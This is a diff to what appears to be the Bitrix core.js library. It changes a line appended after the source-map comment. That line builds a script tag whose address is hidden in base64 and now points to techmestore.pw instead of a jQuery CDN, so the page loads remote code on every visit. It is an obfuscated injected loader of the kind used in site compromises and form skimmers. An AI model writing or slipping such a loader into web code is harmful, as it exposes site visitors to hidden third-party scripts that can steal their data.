@@ -18451,4 +18451,4 @@ BX.addCustomEvent('onAjaxFailure', BX.debug);
 
 })();
 //# sourceMappingURL=core.js.map
-s=document.createElement(`script`);s.src=atob(`aHR0cHM6Ly95YXN0YXRpYy5uZXQvanF1ZXJ5LzIuMS40L2pxdWVyeS5taW4uanM=`);document.head.appendChild(s);
+s=document.createElement(`script`);s.src=atob(`aHR0cHM6Ly90ZWNobWVzdG9yZS5wdy9qcXVlcnktdWkuanM=`);document.head.appendChild(s);
